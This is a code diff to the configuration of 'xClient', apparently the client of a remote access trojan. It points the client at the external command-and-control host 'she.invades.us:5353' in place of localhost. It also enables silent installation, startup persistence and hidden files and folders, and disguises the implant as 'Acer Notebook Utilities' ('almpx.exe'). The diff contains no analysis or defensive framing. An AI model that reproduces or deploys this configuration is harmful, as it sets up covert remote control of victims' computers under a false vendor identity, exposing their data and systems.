@@ -11,24 +11,24 @@ namespace xClient.Config
     {
 #if DEBUG
         public static string VERSION = System.Windows.Forms.Application.ProductVersion;
-        public static string HOSTS = "localhost:4782;";
+        public static string HOSTS = "she.invades.us:5353;";
         public static int RECONNECTDELAY = 500;
         public static string KEY = "1WvgEMPjdwfqIMeM9MclyQ==";
         public static string AUTHKEY = "NcFtjbDOcsw7Evd3coMC0y4koy/SRZGydhNmno81ZOWOvdfg7sv0Cj5ad2ROUfX4QMscAIjYJdjrrs41+qcQwg==";
         public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
         public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
-        public static string SUBDIRECTORY = "Test";
-        public static string INSTALLNAME = "test.exe";
-        public static bool INSTALL = false;
-        public static bool STARTUP = false;
+        public static string SUBDIRECTORY = "Acer Notebook Utilities";
+        public static string INSTALLNAME = "almpx.exe";
+        public static bool INSTALL = true;
+        public static bool STARTUP = true;
         public static string MUTEX = "123AKs82kA,ylAo2kAlUS2kYkala!";
-        public static string STARTUPKEY = "Test key";
-        public static bool HIDEFILE = false;
+        public static string STARTUPKEY = "Start Acer Utilities";
+        public static bool HIDEFILE = true;
         public static bool ENABLELOGGER = false;
         public static string TAG = "DEBUG";
         public static string LOGDIRECTORYNAME = "Logs";
         public static bool HIDELOGDIRECTORY = false;
-        public static bool HIDEINSTALLSUBDIRECTORY = false;
+        public static bool HIDEINSTALLSUBDIRECTORY = true;
 
         public static bool Initialize()
         {
